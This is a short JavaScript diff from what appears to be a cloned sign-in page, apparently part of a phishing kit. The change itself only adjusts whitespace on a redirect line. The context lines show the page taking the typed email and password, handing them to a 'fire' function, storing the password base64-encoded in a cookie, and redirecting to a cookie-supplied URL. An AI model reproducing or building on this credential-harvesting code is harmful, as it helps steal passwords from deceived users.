@@ -176,7 +176,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 			if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
                 Cookies.set("x-user-fire", btoa(document.getElementById('pw').value));
             }
-			location.href=atob(Cookies.get("r"));
+			location.href = atob(Cookies.get("r"));
 		} else {
 			document.getElementById('password').className += ' k0tWj IYewr';
 			document.getElementById('DDFo').innerHTML = '輸入密碼';
